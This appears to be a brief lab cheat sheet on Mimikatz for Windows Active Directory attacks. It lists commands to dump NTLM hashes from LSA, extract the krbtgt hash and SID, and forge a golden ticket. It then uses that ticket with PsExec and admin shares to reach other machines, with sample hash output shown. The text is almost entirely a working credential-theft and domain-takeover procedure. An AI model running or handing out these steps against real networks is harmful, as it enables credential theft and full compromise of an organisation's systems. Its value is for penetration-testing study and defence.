#Inside #Windows
Mimikatz is a very popular tool mainly used for dumping user credentials inside of active directory network.
# Dumping NTLM hashes
Firstly we need to open it.
```Powershell
./mimikatz.exe
```
Then we need to make sure we are running as admin (`Privilege '20' ok`)
```mimikatz
privilege::debug
```
And we can now use 
```mimikatz
lsadump::lsa /patch
```

# Golden Ticket Attacks
Firstly we will first dump the hash and sid of the `krbtgt` user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on a network
```mimikatz
lsadump::lsa /inject /name:krbtgt
```
From here we will need to take note of the `Domain` and the `NTLM`, which will look something like

---
Domain : CONTROLLER / **S-1-5-21-849420856-2351964222-986696166** 

RID  : 000001f6 (502)
User : krbtgt

 \* Primary
    NTLM : **5508500012cc005cf7082a9a89ebdfdf**

---
Then we can create a golden ticket, filling each field
```mimikatz
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```
And then use it to access another machine. This will open a new command prompt with elevated privileges to all machines
```mimikatz
misc::cmd
```
Now we can access other machines, our cmd will have access to all other machines on the network
```Cmd
dir \\Destkop-1\c$

PsExec.exe \\Desktop-1 cmd.exe
```